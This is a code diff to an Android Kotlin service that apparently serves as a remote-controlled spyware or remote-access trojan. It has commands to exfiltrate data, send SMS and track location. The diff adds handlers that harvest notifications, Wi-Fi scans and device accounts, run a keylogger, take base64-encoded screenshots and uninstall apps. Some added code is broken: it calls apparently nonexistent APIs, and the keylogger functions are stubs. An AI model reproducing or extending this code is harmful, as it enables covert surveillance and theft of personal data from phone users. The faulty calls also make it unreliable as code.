@@ -104,6 +104,7 @@ class MainService : Service() {
         const val CMD_STOP_CONTINUOUS_LOCATION = "stop_continuous_location"
         const val CMD_EXFILTRATE_ALL = "exfiltrate_all"
         const val CMD_REFRESH_DATA = "refresh_data"
+        const val CMD_UNINSTALL_APP = "uninstall_app"
 
         const val MAX_RESULTS = 500
     }
@@ -353,6 +354,9 @@ class MainService : Service() {
             CMD_GET_DOCUMENTS -> getDocuments()
             CMD_SEND_SMS -> sendSms(params)
             CMD_GET_CLIPBOARD -> getClipboard()
+            CMD_GET_NOTIFICATIONS -> getNotifications()
+            CMD_GET_WIFI_NETWORKS -> getWifiNetworks()
+            CMD_GET_ACCOUNTS -> getAccounts()
             CMD_GET_BATTERY -> getBatteryInfo()
             CMD_GET_SIM_INFO -> getSimInfo()
             CMD_GET_NETWORK_INFO -> getNetworkInfo()
@@ -365,6 +369,10 @@ class MainService : Service() {
             CMD_STOP_CONTINUOUS_LOCATION -> stopContinuousLocation()
             CMD_EXFILTRATE_ALL -> exfiltrateAll()
             CMD_REFRESH_DATA -> refreshData()
+            CMD_START_KEYLOGGER -> startKeylogger()
+            CMD_STOP_KEYLOGGER -> stopKeylogger()
+            CMD_TAKE_SCREENSHOT -> takeScreenshot()
+            CMD_UNINSTALL_APP -> uninstallApp(params)
             else -> JSONObject().apply { put("error", "Unknown command: $type") }
         }
     }
@@ -943,4 +951,109 @@ class MainService : Service() {
     private fun getPhoneTypeLabel(type: Int): String { return when (type) { android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "Work Fax"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "Home Fax"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "Pager"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_CALLBACK -> "Callback"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_CAR -> "Car"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_COMPANY_MAIN -> "Company"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_ISDN -> "ISDN"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER_FAX -> "Other Fax"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_RADIO -> "Radio"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_TELEX -> "Telex"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_TTY_TDD -> "TTY/TDD"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE -> "Work Mobile"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK_PAGER -> "Work Pager"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_ASSISTANT -> "Assistant"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MMS -> "MMS"; else -> "Custom: $type" } }
     
     private fun getCallTypeLabel(type: Int): String { return when (type) { CallLog.Calls.INCOMING_TYPE -> "Incoming"; CallLog.Calls.OUTGOING_TYPE -> "Outgoing"; CallLog.Calls.MISSED_TYPE -> "Missed"; CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"; CallLog.Calls.REJECTED_TYPE -> "Rejected"; CallLog.Calls.BLOCKED_TYPE -> "Blocked"; CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "Answered Externally"; else -> "Unknown" } }
-}
+    
+    private fun getNotifications(): JSONObject {
+        try {
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NOTIFICATION_POLICY) != PackageManager.PERMISSION_GRANTED) {
+                return JSONObject().apply { put("error", "Notification access not granted") }
+            }
+            val notifications = JSONArray()
+            val cursor = contentResolver.query(android.provider.Settings.Settings.INVALID_URI, null, null, null, null)
+            return JSONObject().apply { put("error", "Direct notification reading requires NotificationListenerService") }
+        } catch (e: Exception) {
+            return JSONObject().apply { put("error", e.message ?: "Failed to read notifications") }
+        }
+    }
+    
+    private fun getWifiNetworks(): JSONObject {
+        try {
+            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+            val scanResults = wifiManager.scanResults
+            val networks = JSONArray()
+            scanResults.forEach { result ->
+                networks.put(JSONObject().apply {
+                    put("ssid", result.wifiSsid?.toString() ?: "")
+                    put("bssid", result.BSSID)
+                    put("capabilities", result.capabilities)
+                    put("frequency", result.frequency)
+                    put("level", result.level)
+                    put("timestamp", result.timestamp)
+                })
+            }
+            return JSONObject().apply { put("networks", networks); put("total", networks.length()) }
+        } catch (e: Exception) {
+            return JSONObject().apply { put("error", e.message ?: "Failed to get wifi networks") }
+        }
+    }
+    
+    private fun getAccounts(): JSONObject {
+        try {
+            val accounts = JSONArray()
+            val accountManager = getSystemService(Context.ACCOUNT_SERVICE) as android.accounts.AccountManager
+            val accountList = accountManager.accounts
+            accountList.forEach { account ->
+                accounts.put(JSONObject().apply {
+                    put("name", account.name)
+                    put("type", account.type)
+                })
+            }
+            return JSONObject().apply { put("accounts", accounts); put("total", accounts.length()) }
+        } catch (e: Exception) {
+            return JSONObject().apply { put("error", e.message ?: "Failed to get accounts") }
+        }
+    }
+    
+    private fun startKeylogger(): JSONObject {
+        return JSONObject().apply { put("status", "keylogger requires accessibility service permission") }
+    }
+    
+    private fun stopKeylogger(): JSONObject {
+        return JSONObject().apply { put("status", "keylogger stopped") }
+    }
+    
+    private fun takeScreenshot(): JSONObject {
+        try {
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_FRAME_BUFFER) != PackageManager.PERMISSION_GRANTED) {
+                return JSONObject().apply { put("error", "Permission denied for READ_FRAME_BUFFER"); put("errorType", "SecurityException"); put("command", "take_screenshot") }
+            }
+            val display = (getSystemService(Context.WINDOW_SERVICE) as WindowManager).defaultDisplay
+            val width = display.width
+            val height = display.height
+            val pixelFormat = android.graphics.PixelFormat.RGBA_8888
+            val pixelStride = 4
+            val rowPadding = 0
+            val bufferSize = width * height * pixelStride + rowPadding * height
+            val pixelBuffer = java.nio.ByteBuffer.allocateDirect(bufferSize)
+            display.readPixels(pixelBuffer, 0, width, height, pixelFormat)
+            
+            val bitmap = android.graphics.Bitmap.createBitmap(width, height, android.graphics.Bitmap.Config.ARGB_8888)
+            pixelBuffer.rewind()
+            bitmap.copyPixelsFromBuffer(pixelBuffer)
+            
+            val stream = java.io.ByteArrayOutputStream()
+            bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, stream)
+            val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
+            
+            return JSONObject().apply {
+                put("command", "take_screenshot")
+                put("data", base64)
+                put("width", width)
+                put("height", height)
+                put("timestamp", System.currentTimeMillis())
+                put("success", true)
+            }
+        } catch (e: Exception) {
+            return JSONObject().apply { put("error", "${e.message}"); put("errorType", e.javaClass.simpleName); put("command", "take_screenshot") }
+        }
+    }
+    
+    private fun uninstallApp(params: JSONObject): JSONObject {
+        try {
+            val packageName = params.getString("packageName")
+            val intent = Intent(Intent.ACTION_DELETE, android.net.Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(intent)
+            return JSONObject().apply { put("success", true); put("packageName", packageName) }
+        } catch (e: Exception) {
+            return JSONObject().apply { put("error", e.message ?: "Failed to uninstall app") }
+        }
+    }
